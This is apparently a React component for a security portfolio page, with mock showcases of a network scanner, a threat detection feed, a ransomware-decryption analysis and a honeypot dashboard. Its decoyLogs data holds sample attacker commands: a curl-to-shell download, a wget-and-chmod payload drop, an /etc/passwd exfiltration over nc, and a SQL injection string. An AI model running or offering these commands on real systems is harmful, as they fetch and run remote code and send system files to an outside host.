import React, { useState, useEffect } from 'react';
import { PORTFOLIO_DATA } from '../../data/portfolioData';
import { NavTab } from '../Navbar';

interface ProjectsViewProps {
  onTabChange: (tab: NavTab) => void;
}

export const ProjectsView: React.FC<ProjectsViewProps> = ({ onTabChange }) => {
  const [selectedCategory, setSelectedCategory] = useState<string>('All Systems');
  const [isScanning, setIsScanning] = useState(false);
  const [scanStep, setScanStep] = useState(4); // all 4 ports visible by default
  const [isStreaming, setIsStreaming] = useState(true);
  const [selectedDecoy, setSelectedDecoy] = useState<'Frankfurt' | 'Singapore' | 'Tokyo' | 'US-East'>('Frankfurt');

  // Interactive scanner simulation
  const handleTriggerScan = () => {
    setIsScanning(true);
    setScanStep(0);
    setTimeout(() => setScanStep(1), 300);
    setTimeout(() => setScanStep(2), 650);
    setTimeout(() => setScanStep(3), 1050);
    setTimeout(() => {
      setScanStep(4);
      setIsScanning(false);
    }, 1450);
  };

  const decoyLogs = {
    Frankfurt: {
      node: 'COWRIE-03 [DE-FRA]',
      user: 'admin',
      pass: 'Summer2023!#',
      cmd: 'curl -s http://194.26.29.11/d.sh | sh',
      action: 'Payload quarantined. SHA-256 cached for VirusTotal feed.',
      ip: '185.220.101.5 (TOR Exit)',
    },
    Singapore: {
      node: 'HONEY-HTTP-01 [AP-SIN]',
      user: 'root',
      pass: 'toor1234',
      cmd: 'wget http://103.14.26.9/shell.elf -O /tmp/kworker && chmod +x /tmp/kworker',
      action: 'Execution trapped inside read-only scratch namespace.',
      ip: '103.251.167.22 (Botnet Ingress)',
    },
    Tokyo: {
      node: 'ECHO-TELNET-04 [AP-NRT]',
      user: 'support',
      pass: 'cisco',
      cmd: 'cat /etc/passwd | nc 45.33.12.8 9001',
      action: 'Synthetic shadow file returned. Exfiltration logged.',
      ip: '210.140.10.88 (Scraper Node)',
    },
    'US-East': {
      node: 'MOCK-API-GW [US-VA]',
      user: 'api_tester',
      pass: 'Bearer eyJhbGciOi...',
      cmd: 'POST /v1/auth/token SQLi: admin\' OR 1=1--',
      action: 'WAF heuristic triggered. IP blacklisted in edge iptables.',
      ip: '198.51.100.82 (Scanning Host)',
    },
  };

  return (
    <div className="flex flex-col w-full text-[#1d1d1f]">
      {/* Subtle Ambient Background Header */}
      <div className="relative w-full bg-white border-b border-[#e5e5ea] overflow-hidden">
        <div className="absolute -top-32 left-1/2 -translate-x-1/2 w-[800px] h-[360px] bg-gradient-to-b from-[#e8f2ff] via-[#f5f9ff] to-transparent blur-3xl pointer-events-none rounded-full"></div>

        {/* Header Section */}
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-10 sm:pt-14 pb-12 sm:pb-16 relative z-10">
          <div className="flex flex-col gap-2 max-w-4xl">
            <div className="flex items-center gap-2">
              <span className="inline-flex items-center justify-center w-2 h-2 rounded-full bg-[#28cd41]"></span>
              <span className="text-[12px] uppercase font-semibold text-[#0071e3] tracking-wider">
                Research &amp; Exploitation Systems
              </span>
            </div>
            <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold tracking-tight text-[#1d1d1f]">
              Engineered for resilience. <br className="hidden sm:inline" />
              Tested against adversity.
            </h1>
            <p className="text-[16px] sm:text-[18px] text-[#6e6e73] mt-2 leading-relaxed max-w-3xl">
              Specialized offensive security tooling, automated telemetry pipelines, and payload analysis engines built from scratch.
            </p>
          </div>

          {/* Quick Telemetry Filter Pills */}
          <div className="flex flex-wrap items-center gap-2 sm:gap-2.5 mt-8 sm:mt-10">
            <span className="font-mono text-[12px] font-semibold text-[#86868b] mr-1">
              MODULES:
            </span>
            {[
              { id: 'All Systems', label: 'All Systems', icon: 'apps' },
              { id: 'Offensive Tooling', label: 'Offensive Tooling' },
              { id: 'Binary Exploitation', label: 'Binary Exploitation' },
              { id: 'Live Telemetry', label: 'Live Telemetry' },
            ].map((btn) => {
              const isActive = selectedCategory === btn.id;
              return (
                <button
                  key={btn.id}
                  onClick={() => setSelectedCategory(btn.id)}
                  className={`px-4 py-1.5 rounded-full text-[13px] font-medium transition-all shadow-sm flex items-center gap-1.5 ${
                    isActive
                      ? 'bg-[#0071e3] text-white'
                      : 'bg-white text-[#1d1d1f] border border-[#d2d2d7] hover:bg-[#f5f5f7] hover:border-[#b0b0b5]'
                  }`}
                >
                  {btn.icon && <span className="material-symbols-outlined text-[16px]">{btn.icon}</span>}
                  <span>{btn.label}</span>
                </button>
              );
            })}
          </div>
        </div>
      </div>

      {/* Deep Dive Showcase Stream */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col gap-12 sm:gap-16 py-12 sm:py-16">
        {/* PROJECT 1: External Network Penetration Testing Suite */}
        {(selectedCategory === 'All Systems' || selectedCategory === 'Offensive Tooling') && (
          <section className="rounded-2xl bg-white border border-[#e5e5ea] p-6 sm:p-8 lg:p-10 shadow-[0_4px_24px_rgba(0,0,0,0.03)] flex flex-col gap-6 sm:gap-8">
            {/* Metadata Row */}
            <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
              <div className="flex flex-col gap-1.5">
                <div className="flex items-center gap-2">
                  <span className="text-[12px] uppercase font-semibold text-[#0071e3] tracking-widest">
                    SEC-AUDIT // 01
                  </span>
                  <span className="text-[#86868b]">•</span>
                  <span className="font-mono text-[12px] text-[#28cd41] font-semibold flex items-center gap-1.5">
                    <span className="w-2 h-2 rounded-full bg-[#28cd41]"></span> ACTIVE RUNNER
                  </span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-[#1d1d1f]">
                  External Network Penetration Testing Suite
                </h2>
                <p className="text-[15px] text-[#6e6e73] max-w-2xl leading-relaxed">
                  Automated port enumeration, service discovery, and banner grabbing across enterprise subnet topologies. Generates structured, prioritized remediation reports pinpointing critical perimeter exposure vectors.
                </p>
              </div>

              {/* Tech Stack Badges */}
              <div className="flex flex-wrap items-center gap-1.5 lg:justify-end max-w-md">
                {['Python', 'Kali Linux', 'Metasploit', 'Nmap NSE'].map((badge, idx) => (
                  <span
                    key={idx}
                    className="px-3 py-1 rounded-full bg-[#f5f5f7] border border-[#e5e5ea] text-[#1d1d1f] font-mono text-[12px] font-medium"
                  >
                    {badge}
                  </span>
                ))}
              </div>
            </div>

            {/* Interactive Terminal Scanner */}
            <div className="rounded-xl bg-[#fbfbfd] border border-[#d2d2d7] overflow-hidden shadow-sm">
              {/* Terminal Header */}
              <div className="bg-[#f5f5f7] border-b border-[#e5e5ea] px-4 py-2.5 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="w-3 h-3 rounded-full bg-[#ff5f56] border border-[#e0443e] inline-block"></span>
                  <span className="w-3 h-3 rounded-full bg-[#ffbd2e] border border-[#dea123] inline-block"></span>
                  <span className="w-3 h-3 rounded-full bg-[#27c93f] border border-[#1aab29] inline-block"></span>
                  <span className="font-mono text-[12px] text-[#6e6e73] ml-2 font-medium">
                    net-audit-daemon // target-subnet: 198.51.100.0/24
                  </span>
                </div>
                <div className="flex items-center gap-3 font-mono text-[12px] text-[#6e6e73]">
                  <button
                    onClick={handleTriggerScan}
                    disabled={isScanning}
                    className="inline-flex items-center gap-1 px-2.5 py-1 rounded bg-white border border-[#d2d2d7] text-[#0071e3] hover:bg-[#e8f2ff] text-[11px] font-semibold transition-colors disabled:opacity-50"
                  >
                    <span className="material-symbols-outlined text-[14px]">
                      {isScanning ? 'sync' : 'play_arrow'}
                    </span>
                    <span>{isScanning ? 'Scanning...' : 'Run Live Sweep'}</span>
                  </button>
                  <span className="hidden sm:inline text-[#d2d2d7]">|</span>
                  <span className="hidden sm:inline">THREADS: 64</span>
                  <span className="hidden sm:inline text-[#0071e3] font-semibold">
                    RATE: 4.8k pkts/sec
                  </span>
                </div>
              </div>

              {/* Terminal Body */}
              <div className="p-4 sm:p-6 font-mono text-[12.5px] sm:text-[13px] flex flex-col gap-2 text-[#1d1d1f]">
                <div className="text-[#6e6e73] flex items-center gap-2">
                  <span className="text-[#28cd41] font-bold">$</span>
                  <span className="text-[#0071e3] font-semibold">python3</span> -m psec.scanner --target edge-gw.corp.internal --full-mesh --fingerprint --vuln-heuristic
                </div>
                <div className="text-[#424245]">
                  [+] Target resolution verified: 198.51.100.42 (Edge Reverse Ingress Gateway)
                </div>
                <div className="text-[#424245]">
                  [+] Initiating SYN Stealth Reconnaissance across 65535 ports...
                </div>

                {/* Port Telemetry Grid Inside Terminal */}
                <div className="mt-2 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-3">
                  {/* Port 22 */}
                  {scanStep >= 1 && (
                    <div className="rounded-lg bg-white border border-[#e5e5ea] p-3.5 flex flex-col gap-1 shadow-xs animate-in fade-in duration-200">
                      <div className="flex items-center justify-between">
                        <span className="text-[#1d1d1f] font-semibold">22/TCP</span>
                        <span className="px-2 py-0.5 rounded text-[11px] bg-[#f5f5f7] border border-[#e5e5ea] text-[#424245] font-semibold">
                          OPEN
                        </span>
                      </div>
                      <div className="text-[#0071e3] text-[11.5px] font-medium">
                        SSH-2.0-OpenSSH_8.9p1
                      </div>
                      <div className="text-[#86868b] text-[11px] truncate">
                        Key: curve25519-sha256
                      </div>
                      <div className="text-[#28cd41] text-[11px] mt-1 flex items-center gap-1 font-medium">
                        <span className="w-1.5 h-1.5 rounded-full bg-[#28cd41]"></span> Auth: Pubkey Only
                      </div>
                    </div>
                  )}

                  {/* Port 80 */}
                  {scanStep >= 2 && (
                    <div className="rounded-lg bg-white border border-[#e5e5ea] p-3.5 flex flex-col gap-1 shadow-xs animate-in fade-in duration-200">
                      <div className="flex items-center justify-between">
                        <span className="text-[#1d1d1f] font-semibold">80/TCP</span>
                        <span className="px-2 py-0.5 rounded text-[11px] bg-[#f5f5f7] border border-[#e5e5ea] text-[#424245] font-semibold">
                          OPEN
                        </span>
                      </div>
                      <div className="text-[#0071e3] text-[11.5px] font-medium">
                        HTTP Nginx 1.22.1
                      </div>
                      <div className="text-[#86868b] text-[11px] truncate">
                        301 Moved Permanently
                      </div>
                      <div className="text-[#28cd41] text-[11px] mt-1 flex items-center gap-1 font-medium">
                        <span className="w-1.5 h-1.5 rounded-full bg-[#28cd41]"></span> HSTS Redirect Active
                      </div>
                    </div>
                  )}

                  {/* Port 443 */}
                  {scanStep >= 3 && (
                    <div className="rounded-lg bg-white border border-[#e5e5ea] p-3.5 flex flex-col gap-1 shadow-xs animate-in fade-in duration-200">
                      <div className="flex items-center justify-between">
                        <span className="text-[#1d1d1f] font-semibold">443/TCP</span>
                        <span className="px-2 py-0.5 rounded text-[11px] bg-[#f5f5f7] border border-[#e5e5ea] text-[#424245] font-semibold">
                          OPEN
                        </span>
                      </div>
                      <div className="text-[#0071e3] text-[11.5px] font-medium">
                        TLSv1.3 Ingress Proxy
                      </div>
                      <div className="text-[#86868b] text-[11px] truncate">
                        Cert: *.corp.internal (Valid)
                      </div>
                      <div className="text-[#28cd41] text-[11px] mt-1 flex items-center gap-1 font-medium">
                        <span className="w-1.5 h-1.5 rounded-full bg-[#28cd41]"></span> TLS Cipher: PFS Armed
                      </div>
                    </div>
                  )}

                  {/* Port 445 */}
                  {scanStep >= 4 && (
                    <div className="rounded-lg bg-[#fff5f5] border border-[#ffb4ab] p-3.5 flex flex-col gap-1 shadow-xs animate-in fade-in duration-200">
                      <div className="flex items-center justify-between">
                        <span className="text-[#d70015] font-bold">445/TCP</span>
                        <span className="px-2 py-0.5 rounded text-[11px] bg-[#ffdad6] text-[#d70015] font-bold">
                          ALERT
                        </span>
                      </div>
                      <div className="text-[#d70015] text-[11.5px] font-medium">
                        SMBv1 Protocol Exposed
                      </div>
                      <div className="text-[#86868b] text-[11px] truncate">
                        Dialect: NT LM 0.12 (Deprecated)
                      </div>
                      <div className="text-[#d70015] text-[11px] mt-1 flex items-center gap-1 font-semibold">
                        <span className="w-1.5 h-1.5 rounded-full bg-[#d70015] animate-ping"></span> High Exploit Risk
                      </div>
                    </div>
                  )}
                </div>

                {/* Bottom CLI log */}
                <div className="mt-2 pt-2 border-t border-[#e5e5ea] flex flex-col gap-1 text-[11.5px] text-[#424245]">
                  <div>
                    <span className="text-[#f56300] font-semibold">[!] WARNING:</span> Port 445 SMBv1 allows potential NULL session enumeration. Metasploit candidate:{' '}
                    <span className="text-[#0071e3] font-mono font-semibold">
                      auxiliary/scanner/smb/smb_version
                    </span>
                  </div>
                  <div>
                    <span className="text-[#28cd41] font-semibold">[✓] REMEDIATION DISPATCH:</span> Perimeter Isolation Rule #882 generated automatically in markdown.
                  </div>
                </div>
              </div>
            </div>

            {/* Action & Metrics Bar */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3 sm:gap-4 pt-2">
              <div className="rounded-xl bg-[#f5f5f7] border border-[#e5e5ea] p-4 flex flex-col">
                <span className="text-[11px] uppercase font-semibold text-[#86868b]">Target Scan Speed</span>
                <span className="text-xl sm:text-2xl font-bold text-[#1d1d1f] mt-1">1.8s</span>
                <span className="text-[12px] text-[#6e6e73]">Per /24 CIDR block</span>
              </div>
              <div className="rounded-xl bg-[#f5f5f7] border border-[#e5e5ea] p-4 flex flex-col">
                <span className="text-[11px] uppercase font-semibold text-[#86868b]">NSE Detection Scripts</span>
                <span className="text-xl sm:text-2xl font-bold text-[#0071e3] mt-1">140+</span>
                <span className="text-[12px] text-[#6e6e73]">Custom written checks</span>
              </div>
              <div className="rounded-xl bg-[#f5f5f7] border border-[#e5e5ea] p-4 flex flex-col">
                <span className="text-[11px] uppercase font-semibold text-[#86868b]">Telemetry Output</span>
                <span className="text-xl sm:text-2xl font-bold text-[#1d1d1f] mt-1">JSON / MD</span>
                <span className="text-[12px] text-[#6e6e73]">SIEM ready pipelines</span>
              </div>
              <div className="rounded-xl bg-[#f5f5f7] border border-[#e5e5ea] p-4 flex flex-col justify-between">
                <span className="text-[11px] uppercase font-semibold text-[#86868b]">Audit Compliance</span>
                <div className="text-xl sm:text-2xl font-bold text-[#28cd41] mt-1">CVSS v3.1</div>
                <span className="text-[12px] text-[#6e6e73]">Automated remediation</span>
              </div>
            </div>
          </section>
        )}

        {/* PROJECT 2: Automated Threat Detection Engine */}
        {(selectedCategory === 'All Systems' || selectedCategory === 'Live Telemetry') && (
          <section className="grid grid-cols-1 lg:grid-cols-12 gap-6 sm:gap-8">
            {/* Left Narrative Card */}
            <div className="lg:col-span-5 rounded-2xl bg-white border border-[#e5e5ea] p-6 sm:p-8 flex flex-col justify-between shadow-[0_4px_24px_rgba(0,0,0,0.03)]">
              <div className="flex flex-col gap-4">
                <div className="flex items-center gap-2">
                  <span className="text-[12px] uppercase font-semibold text-[#0071e3] tracking-widest">
                    DETECTION-CORE // 02
                  </span>
                  <span className="text-[#86868b]">•</span>
                  <span className="font-mono text-[12px] text-[#86868b] font-medium">GOLANG RUNTIME</span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-[#1d1d1f]">
                  Automated Threat Detection Engine
                </h2>
                <p className="text-[14.5px] text-[#6e6e73] leading-relaxed">
                  High-throughput packet analysis pipeline parsing live traffic flows for brute-force signatures and scanning probes. Indexes anomalous event records directly into Elasticsearch for real-time Kibana query triage.
                </p>

                {/* Architectural Highlights */}
                <div className="flex flex-col gap-2.5 mt-2">
                  <div className="flex items-start gap-3 p-3 rounded-xl bg-[#f5f5f7] border border-[#e5e5ea]">
                    <span className="material-symbols-outlined text-[#0071e3] text-[22px] shrink-0 mt-0.5">
                      bolt
                    </span>
                    <div>
                      <p className="text-[13px] text-[#1d1d1f] font-semibold">Zero-Copy BPF Filtering</p>
                      <p className="text-[12px] text-[#6e6e73] mt-0.5">
                        Raw socket capture discarding non-relevant baseline packet volume before userspace memory copy.
                      </p>
                    </div>
                  </div>
                  <div className="flex items-start gap-3 p-3 rounded-xl bg-[#f5f5f7] border border-[#e5e5ea]">
                    <span className="material-symbols-outlined text-[#0071e3] text-[22px] shrink-0 mt-0.5">
                      query_stats
                    </span>
                    <div>
                      <p className="text-[13px] text-[#1d1d1f] font-semibold">Elasticsearch Event Forwarding</p>
                      <p className="text-[12px] text-[#6e6e73] mt-0.5">
                        Structured JSON document shipping with microsecond-precision NTP synchronization for threat hunting.
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              <div className="mt-8 flex flex-wrap items-center gap-1.5">
                {['Go', 'Wireshark / PCAP', 'ELK Stack', 'Python'].map((tag, idx) => (
                  <span
                    key={idx}
                    className="px-3 py-1 rounded-full bg-[#f5f5f7] border border-[#e5e5ea] text-[#1d1d1f] font-mono text-[12px] font-medium"
                  >
                    {tag}
                  </span>
                ))}
              </div>
            </div>

            {/* Right Telemetry Stream Mock */}
            <div className="lg:col-span-7 rounded-2xl bg-white border border-[#e5e5ea] p-5 sm:p-6 flex flex-col gap-4 shadow-[0_4px_24px_rgba(0,0,0,0.03)] overflow-hidden">
              {/* Live Traffic Header Bar */}
              <div className="flex items-center justify-between pb-2 bg-[#f5f5f7] border border-[#e5e5ea] px-4 py-2.5 rounded-xl">
                <div className="flex items-center gap-2">
                  <span className={`w-2.5 h-2.5 rounded-full ${isStreaming ? 'bg-[#28cd41] animate-pulse' : 'bg-[#86868b]'}`}></span>
                  <span className="font-mono text-[12.5px] text-[#1d1d1f] font-semibold">
                    LIVE INGESTION: eth0 [10 GbE]
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => setIsStreaming(!isStreaming)}
                    className="text-[11px] font-mono font-medium px-2 py-0.5 rounded bg-white border border-[#d2d2d7] text-[#6e6e73] hover:text-[#1d1d1f]"
                  >
                    {isStreaming ? 'Pause Feed' : 'Resume Feed'}
                  </button>
                  <span className="font-mono text-[11px] text-[#0071e3] font-semibold">
                    BUFFER: 41,209 EPS
                  </span>
                </div>
              </div>

              {/* Packet Inspection Visual Feed */}
              <div className="flex flex-col gap-2 font-mono text-[11.5px] overflow-hidden">
                {/* Telemetry Row 1 */}
                <div className="p-3 rounded-xl bg-[#fffaf0] border border-[#ffe0b2] flex flex-col sm:flex-row sm:items-center justify-between gap-1.5 hover:bg-[#fff5e0] transition-colors">
                  <div className="flex items-center gap-2">
                    <span className="px-1.5 py-0.5 rounded bg-[#f56300]/15 text-[#f56300] font-bold text-[10px]">
                      WARN
                    </span>
                    <span className="text-[#1d1d1f] font-semibold">192.168.1.104:49152 → 10.0.0.5:22</span>
                  </div>
                  <div className="text-[#6e6e73]">TCP [SYN] Flood Probe (52 attempts / 400ms)</div>
                </div>

                {/* Telemetry Row 2 */}
                <div className="p-3 rounded-xl bg-[#fff5f5] border border-[#ffcdd2] flex flex-col sm:flex-row sm:items-center justify-between gap-1.5 shadow-xs">
                  <div className="flex items-center gap-2">
                    <span className="px-1.5 py-0.5 rounded bg-[#d70015]/15 text-[#d70015] font-bold text-[10px]">
                      ALERT
                    </span>
                    <span className="text-[#1d1d1f] font-semibold">45.33.32.156:58221 → 10.0.0.12:8080</span>
                  </div>
                  <div className="text-[#d70015] font-semibold">Log4Shell JNDI Payload Pattern Detected</div>
                </div>

                {/* Telemetry Row 3 */}
                <div className="p-3 rounded-xl bg-[#f5f5f7] border border-[#e5e5ea] flex flex-col sm:flex-row sm:items-center justify-between gap-1.5 hover:bg-[#ebebed] transition-colors">
                  <div className="flex items-center gap-2">
                    <span className="px-1.5 py-0.5 rounded bg-[#e5e5ea] text-[#6e6e73] font-semibold text-[10px]">
                      INFO
                    </span>
                    <span className="text-[#424245] font-medium">10.0.0.88:34112 → 10.0.0.2:53</span>
                  </div>
                  <div className="text-[#86868b]">Standard DNS PTR Query [internal.corp]</div>
                </div>

                {/* Telemetry Row 4 */}
                <div className="p-3 rounded-xl bg-[#fffaf0] border border-[#ffe0b2] flex flex-col sm:flex-row sm:items-center justify-between gap-1.5 hover:bg-[#fff5e0] transition-colors">
                  <div className="flex items-center gap-2">
                    <span className="px-1.5 py-0.5 rounded bg-[#f56300]/15 text-[#f56300] font-bold text-[10px]">
                      WARN
                    </span>
                    <span className="text-[#1d1d1f] font-semibold">185.220.101.4:60119 → 10.0.0.9:3389</span>
                  </div>
                  <div className="text-[#6e6e73]">RDP Brute Force credential rotation burst</div>
                </div>
              </div>

              {/* Inline Packet Metric Chart (SVG) */}
              <div className="rounded-xl bg-[#fbfbfd] border border-[#e5e5ea] p-4 flex flex-col gap-1">
                <div className="flex items-center justify-between text-[11px] font-mono">
                  <span className="text-[#6e6e73] font-semibold">ANOMALY DENSITY WAVEFORM (LAST 60s)</span>
                  <span className="text-[#d70015] font-bold">+18.4% anomaly spike</span>
                </div>
                <svg
                  className="w-full h-20 text-[#0071e3]"
                  fill="none"
                  preserveAspectRatio="none"
                  viewBox="0 0 600 80"
                >
                  <path
                    d="M0,50 L40,48 L80,51 L120,45 L160,49 L200,42 L240,44 L280,35 L320,12 L360,18 L400,38 L440,46 L480,44 L520,40 L560,43 L600,41"
                    stroke="currentColor"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2.5"
                  ></path>
                  <path
                    d="M0,50 L40,48 L80,51 L120,45 L160,49 L200,42 L240,44 L280,35 L320,12 L360,18 L400,38 L440,46 L480,44 L520,40 L560,43 L600,41 L600,80 L0,80 Z"
                    fill="currentColor"
                    fillOpacity="0.08"
                  ></path>
                </svg>
              </div>
            </div>
          </section>
        )}

        {/* PROJECT 3: Ransomware Decryption & Payload Analysis Tool */}
        {(selectedCategory === 'All Systems' || selectedCategory === 'Binary Exploitation') && (
          <section className="grid grid-cols-1 lg:grid-cols-12 gap-6 sm:gap-8">
            {/* Disassembly Inspector Graphic */}
            <div className="lg:col-span-7 rounded-2xl bg-white border border-[#e5e5ea] p-5 sm:p-6 flex flex-col gap-4 shadow-[0_4px_24px_rgba(0,0,0,0.03)] order-2 lg:order-1">
              {/* Ghidra Inspector Bar */}
              <div className="bg-[#f5f5f7] border border-[#e5e5ea] px-4 py-2.5 rounded-xl flex items-center justify-between font-mono text-[12px]">
                <div className="flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-[#0071e3]"></span>
                  <span className="text-[#1d1d1f] font-semibold">
                    GHIDRA DECOMPILER // target_crypto_stub.dll
                  </span>
                </div>
                <span className="text-[#86868b] font-medium">ARCH: x86_64 PE32+</span>
              </div>

              {/* Opcode / Assembly Window */}
              <div className="rounded-xl bg-[#fbfbfd] border border-[#e5e5ea] p-4 font-mono text-[12px] flex flex-col gap-2 overflow-x-auto text-[#1d1d1f]">
                <div className="text-[#86868b] italic">; --- CRYPTO LOGIC RECONSTRUCTION ---</div>
                <div className="text-[#86868b] italic">; Flaw Identified: Predictable PRNG seed derivation via GetTickCount</div>
                <div className="flex items-center gap-4 text-[#424245]">
                  <span className="text-[#86868b] w-24">0x1400010A0</span>
                  <span className="text-[#0071e3] font-semibold w-16">CALL</span>
                  <span className="text-[#1d1d1f]">qword ptr [__imp_GetTickCount]</span>
                </div>
                <div className="flex items-center gap-4 text-[#424245]">
                  <span className="text-[#86868b] w-24">0x1400010A6</span>
                  <span className="text-[#0071e3] font-semibold w-16">MOV</span>
                  <span className="text-[#1d1d1f]">dword ptr [rbp-0x14], eax &nbsp;; &lt;-- VULNERABLE SEED</span>
                </div>
                <div className="flex items-center gap-4 text-[#424245]">
                  <span className="text-[#86868b] w-24">0x1400010A9</span>
                  <span className="text-[#0071e3] font-semibold w-16">XOR</span>
                  <span className="text-[#1d1d1f]">ecx, 0x5a3f89bc &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;; Static mask constant</span>
                </div>
                <div className="flex items-center gap-4 text-[#424245]">
                  <span className="text-[#86868b] w-24">0x1400010AF</span>
                  <span className="text-[#0071e3] font-semibold w-16">LEA</span>
                  <span className="text-[#0071e3] font-semibold">rdx, [AES256_Key_Schedule]</span>
                </div>
                <div className="flex items-center gap-4 text-[#28cd41] font-semibold bg-[#28cd41]/10 px-3 py-1.5 rounded-lg border border-[#28cd41]/20">
                  <span className="text-[#6e6e73] w-24">0x1400010B6</span>
                  <span className="text-[#28cd41] w-16 font-bold">EXPLOIT</span>
                  <span className="text-[#1d1d1f]">Key Recovery Feasible via 32-bit Seed Brute-Force</span>
                </div>
              </div>

              {/* Decryption Progress Diagnostic Wells */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                <div className="rounded-xl bg-[#f5f5f7] border border-[#e5e5ea] p-3.5 flex flex-col">
                  <span className="text-[11px] text-[#86868b] font-medium uppercase">Target Files Restored</span>
                  <span className="text-xl font-bold text-[#28cd41] mt-1">100%</span>
                  <span className="text-[11.5px] text-[#6e6e73]">Zero private key cost</span>
                </div>
                <div className="rounded-xl bg-[#f5f5f7] border border-[#e5e5ea] p-3.5 flex flex-col">
                  <span className="text-[11px] text-[#86868b] font-medium uppercase">Seed Entropy Space</span>
                  <span className="text-xl font-bold text-[#1d1d1f] mt-1">2^32</span>
                  <span className="text-[11.5px] text-[#6e6e73]">Exhausted in ~14 mins</span>
                </div>
                <div className="rounded-xl bg-[#f5f5f7] border border-[#e5e5ea] p-3.5 flex flex-col">
                  <span className="text-[11px] text-[#86868b] font-medium uppercase">Extracted Format</span>
                  <span className="text-xl font-bold text-[#0071e3] mt-1">C / C++</span>
                  <span className="text-[11.5px] text-[#6e6e73]">Standalone tool binary</span>
                </div>
              </div>
            </div>

            {/* Right Description Card */}
            <div className="lg:col-span-5 rounded-2xl bg-white border border-[#e5e5ea] p-6 sm:p-8 flex flex-col justify-between shadow-[0_4px_24px_rgba(0,0,0,0.03)] order-1 lg:order-2">
              <div className="flex flex-col gap-4">
                <div className="flex items-center gap-2">
                  <span className="text-[12px] uppercase font-semibold text-[#0071e3] tracking-widest">
                    MALWARE-ANALYSIS // 03
                  </span>
                  <span className="text-[#86868b]">•</span>
                  <span className="font-mono text-[12px] text-[#d70015] font-semibold">REVERSE ENG</span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-[#1d1d1f]">
                  Ransomware Decryption &amp; Payload Analysis Tool
                </h2>
                <p className="text-[14.5px] text-[#6e6e73] leading-relaxed">
                  Disassembled malicious PE binaries to uncover structural cryptographic flaws in custom file-locking implementations. Built a high-performance offline extraction utility in C++ that restores encrypted user assets without ransom compliance.
                </p>

                <div className="rounded-xl bg-[#f5f5f7] border border-[#e5e5ea] p-4 flex flex-col gap-1 mt-1">
                  <span className="text-[11px] uppercase tracking-wider font-semibold text-[#6e6e73]">
                    Cryptographic Breakthrough
                  </span>
                  <p className="text-[13px] text-[#1d1d1f] leading-relaxed">
                    The attacker leveraged a home-grown stream cipher wrapper relying on system boot uptime. By calibrating against Windows Event Logs, the entropy window was narrowed to under 300,000 potential keys.
                  </p>
                </div>
              </div>

              <div className="mt-8 flex flex-wrap items-center gap-1.5">
                {['C++', 'C', 'Ghidra', 'x86_64 ASM'].map((tag, idx) => (
                  <span
                    key={idx}
                    className="px-3 py-1 rounded-full bg-[#f5f5f7] border border-[#e5e5ea] text-[#1d1d1f] font-mono text-[12px] font-medium"
                  >
                    {tag}
                  </span>
                ))}
              </div>
            </div>
          </section>
        )}

        {/* PROJECT 4: Honeypot Telemetry Node */}
        {(selectedCategory === 'All Systems' || selectedCategory === 'Live Telemetry') && (
          <section className="rounded-2xl bg-white border border-[#e5e5ea] p-6 sm:p-8 lg:p-10 shadow-[0_4px_24px_rgba(0,0,0,0.03)] flex flex-col gap-6 sm:gap-8">
            <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
              <div className="flex flex-col gap-1.5">
                <div className="flex items-center gap-2">
                  <span className="text-[12px] uppercase font-semibold text-[#0071e3] tracking-widest">
                    DECEPTION-GRID // 04
                  </span>
                  <span className="text-[#86868b]">•</span>
                  <span className="font-mono text-[12px] text-[#86868b] font-medium">CONTAINER MESH</span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-[#1d1d1f]">
                  Honeypot Telemetry Node
                </h2>
                <p className="text-[15px] text-[#6e6e73] max-w-2xl leading-relaxed">
                  Constructed low-interaction containerized decoys recording exploit traffic, authentication attempts, and shell payloads. Automated protocol telemetry reports via scheduled Bash pipelines.
                </p>
              </div>

              <div className="flex flex-wrap items-center gap-1.5 lg:justify-end max-w-md">
                {['Java', 'Docker', 'Wireshark', 'Bash'].map((tag, idx) => (
                  <span
                    key={idx}
                    className="px-3 py-1 rounded-full bg-[#f5f5f7] border border-[#e5e5ea] text-[#1d1d1f] font-mono text-[12px] font-medium"
                  >
                    {tag}
                  </span>
                ))}
              </div>
            </div>

            {/* Telemetry Dashboard Mock */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
              {/* Attack Origin Geospatial Visualizer */}
              <div className="lg:col-span-2 rounded-xl bg-[#fbfbfd] border border-[#e5e5ea] p-5 flex flex-col justify-between shadow-xs relative overflow-hidden">
                <div className="flex items-center justify-between pb-2 z-10">
                  <div className="flex items-center gap-2">
                    <span className="material-symbols-outlined text-[#0071e3] text-[20px]">public</span>
                    <span className="font-mono text-[12.5px] text-[#1d1d1f] font-semibold">
                      DECOY HIT CLUSTERS (REAL-TIME SENSORS)
                    </span>
                  </div>
                  <span className="font-mono text-[11px] text-[#28cd41] font-semibold flex items-center gap-1.5">
                    <span className="w-2 h-2 rounded-full bg-[#28cd41]"></span> 6 NODES LIVE
                  </span>
                </div>

                {/* Conceptual Vector World Surface with Sensor Dots */}
                <div className="relative w-full h-56 flex items-center justify-center my-3 bg-white border border-[#e5e5ea] rounded-xl overflow-hidden">
                  {/* Simulated Grid Canvas */}
                  <svg className="absolute inset-0 w-full h-full opacity-60" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                      <pattern id="grid" width="30" height="30" patternUnits="userSpaceOnUse">
                        <path d="M 30 0 L 0 0 0 30" fill="none" stroke="currentColor" className="text-[#e5e5ea]" strokeWidth="1" />
                      </pattern>
